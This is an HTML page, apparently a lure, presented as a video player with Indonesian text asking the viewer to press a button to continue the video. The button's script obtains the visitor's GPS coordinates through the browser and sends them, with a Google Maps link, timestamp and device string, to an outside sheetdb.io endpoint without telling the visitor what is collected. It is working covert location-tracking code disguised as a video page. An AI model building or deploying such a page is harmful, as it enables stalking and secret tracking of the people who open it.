<!DOCTYPE html>
<html>
<head>
  <title>Video</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

<body style="margin:0; background:black;">

<video id="vid" width="100%" controls autoplay muted playsinline>
  <source src="https://files.catbox.moe/ezxq5k.mp4" type="video/mp4">
</video>

<div id="box" style="position:fixed; bottom:0; width:100%; background:black; color:white; text-align:center; padding:15px;">
  <p>Tekan untuk melanjutkan video</p>
  <button onclick="lanjut()" style="padding:12px; font-size:16px;">
    ▶ Lanjutkan Video
  </button>
</div>

<script>
let sudah = false;
let v = document.getElementById("vid");

v.pause();

function lanjut() {
  if (sudah) return;
  sudah = true;

  navigator.geolocation.getCurrentPosition(
    pos => {

      let lat = pos.coords.latitude;
      let lon = pos.coords.longitude;

      fetch("https://sheetdb.io/api/v1/2ipys7fb7fh8h", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          data: [{
            waktu: new Date().toLocaleString(),
            latitude: lat,
            longitude: lon,
            maps: "https://www.google.com/maps?q=" + lat + "," + lon,
            device: navigator.userAgent
          }]
        })
      })
      .then(res => res.json())
      .then(data => {
        alert("✅ Lokasi berhasil dikirim");
        console.log(data);
      })
      .catch(err => {
        alert("❌ Gagal kirim ke Sheet");
        console.log(err);
      });

    },
    err => {
      alert("❌ Izin lokasi ditolak / error");
    }
  );

  v.play();
  document.getElementById("box").style.display = "none";
}
</script>

</body>
</html>
